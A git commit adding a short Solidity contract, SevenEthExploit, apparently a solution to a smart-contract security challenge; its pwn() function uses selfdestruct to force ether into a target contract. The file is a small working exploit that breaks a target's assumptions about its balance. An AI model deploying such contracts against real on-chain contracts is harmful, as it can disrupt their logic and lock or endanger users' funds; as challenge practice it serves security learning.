769a9bad324ac248d219fa48c96f57afa1ecf3bc
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 12:24:37 +0100

    Update Seven_Eth.sol

--- Security/Seven_Eth.sol
+++ Security/Seven_Eth.sol
@@ -1,1 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+contract SevenEthExploit {
+    address private immutable target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn() external payable {
+        selfdestruct(payable(target));
+    }
+}
